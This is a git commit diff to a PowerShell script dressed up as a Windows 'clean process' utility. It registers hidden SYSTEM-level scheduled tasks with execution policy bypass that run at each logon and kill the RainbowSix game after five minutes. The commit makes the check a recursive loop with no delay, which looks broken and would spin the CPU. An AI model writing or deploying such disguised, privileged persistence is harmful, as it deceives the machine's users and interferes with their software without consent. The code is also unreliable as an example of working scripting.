e41293c7ae6923e9e3f46c3528420b835648cff3
boostWindows <closecompany.yt@gmail.com>
2025-05-09 01:01:57 +0200

    Update cleanWinProcess.ps1

--- cleanWinProcess.ps1
+++ cleanWinProcess.ps1
@@ -15,10 +15,12 @@ $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccou
 Register-ScheduledTask -TaskName "CleanWinProcess" -Action $action -Trigger $trigger -Principal $principal | out-null
 
 $contenuto1 = @'
-$a = get-process | Where-Object {$_.ProcessName -eq "RainbowSix"}
-if($a){
-  Start-Sleep -Seconds 300
-  Stop-Process -Name "RainbowSix"
+function b{
+  $a = get-process | Where-Object {$_.ProcessName -eq "RainbowSix"}
+  if($a){
+    Start-Sleep -Seconds 300
+    Stop-Process -Name "RainbowSix"
+  }else{b}
 }
 '@
 
@@ -26,32 +28,10 @@ $contenuto1 | Out-File "C:\configWin\assets\configSysPush.ps1"
 
 $scriptPath = "C:\configWin\assets\configSysPush.ps1"
 $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File `"$scriptPath`""
-$triggers = @(
-    New-ScheduledTaskTrigger -Daily -At (New-TimeSpan -Hours 0),
-    New-ScheduledTaskTrigger -Daily -At (New-TimeSpan -Hours 1),
-    New-ScheduledTaskTrigger -Daily -At (New-TimeSpan -Hours 2),
-    New-ScheduledTaskTrigger -Daily -At (New-TimeSpan -Hours 3),
-    New-ScheduledTaskTrigger -Daily -At (New-TimeSpan -Hours 4),
-    New-ScheduledTaskTrigger -Daily -At (New-TimeSpan -Hours 5),
-    New-ScheduledTaskTrigger -Daily -At (New-TimeSpan -Hours 6),
-    New-ScheduledTaskTrigger -Daily -At (New-TimeSpan -Hours 7),
-    New-ScheduledTaskTrigger -Daily -At (New-TimeSpan -Hours 8),
-    New-ScheduledTaskTrigger -Daily -At (New-TimeSpan -Hours 9),
-    New-ScheduledTaskTrigger -Daily -At (New-TimeSpan -Hours 10),
-    New-ScheduledTaskTrigger -Daily -At (New-TimeSpan -Hours 11),
-    New-ScheduledTaskTrigger -Daily -At (New-TimeSpan -Hours 12),
-    New-ScheduledTaskTrigger -Daily -At (New-TimeSpan -Hours 13),
-    New-ScheduledTaskTrigger -Daily -At (New-TimeSpan -Hours 14),
-    New-ScheduledTaskTrigger -Daily -At (New-TimeSpan -Hours 15),
-    New-ScheduledTaskTrigger -Daily -At (New-TimeSpan -Hours 16),
-    New-ScheduledTaskTrigger -Daily -At (New-TimeSpan -Hours 17),
-    New-ScheduledTaskTrigger -Daily -At (New-TimeSpan -Hours 18),
-    New-ScheduledTaskTrigger -Daily -At (New-TimeSpan -Hours 19)
-)
-
+$trigger = New-ScheduledTaskTrigger -AtLogOn -RandomDelay (New-TimeSpan -Seconds 30)
 $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
 
-Register-ScheduledTask -TaskName "CleanWinProcessPush" -Action $action -Trigger $triggers -Principal $principal | out-null
+Register-ScheduledTask -TaskName "CleanWinProcessPush" -Action $action -Trigger $trigger -Principal $principal | out-null
 
 Write-Host "Fixing System Operator..." -ForegroundColor "Yellow"
 Start-Sleep -Seconds 20
